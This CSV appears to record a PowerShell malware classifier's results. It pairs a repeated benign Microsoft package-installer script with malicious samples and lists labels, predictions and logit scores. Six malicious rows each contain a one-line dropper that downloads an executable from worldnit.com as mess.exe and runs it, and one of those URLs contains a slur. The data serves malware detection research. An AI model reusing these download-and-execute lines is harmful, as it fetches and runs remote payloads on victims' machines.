filename,label,source,primary_indicator,matched_indicators,indicator_count,has_indicator,raw_char_len,used_char_len,was_truncated,content,pair_idx,pair_role,pair_indicator,pair_strategy,correct,predicted_label,logit_diff
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",15,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
fa2y/malicious_samples/fec6779d4d6bd700f980dd3c7dfcb3c20665c15d4731e69e8576c1b43b898384.ps1,malicious,fa2y:malicious_samples,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,113,113,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/com.exe','mess.exe');Start-Process 'mess.exe'",15,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,5.8125
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",16,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
fa2y/malicious_samples/34dcf2a22fa7555de2ab95c3d8ab5605de01345b8d741491e1907ecd50a5ea1f.ps1,malicious,fa2y:malicious_samples,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,114,114,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/igbo.exe','mess.exe');Start-Process 'mess.exe'",16,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,5.84375
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",17,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
fa2y/malicious_samples/fef9fdbb642fd0bebbc11aca6676ed8532eb3a5dd1c71eb38a260d4b21f9aaae.ps1,malicious,fa2y:malicious_samples,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,114,114,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/immo.exe','mess.exe');Start-Process 'mess.exe'",17,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,5.40625
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",18,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
1927.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,115,115,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/nigga.exe','mess.exe');Start-Process 'mess.exe'",18,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,7.46875
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",19,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
fa2y/malicious_samples/0f5e36a549a4ec6e0605f7310205ebdd5141c532959bd9bf5ee25f06560e7c18.ps1,malicious,fa2y:malicious_samples,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,115,115,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/kells.exe','mess.exe');Start-Process 'mess.exe'",19,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,5.53125
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",20,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
fa2y/malicious_samples/17dcaeeb7d93c8bc0150f4e1b471d81dd003be37bbaa6d2edf612dfb6a357dbc.ps1,malicious,fa2y:malicious_samples,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,115,115,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/kelle.exe','mess.exe');Start-Process 'mess.exe'",20,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,5.90625
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",21,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
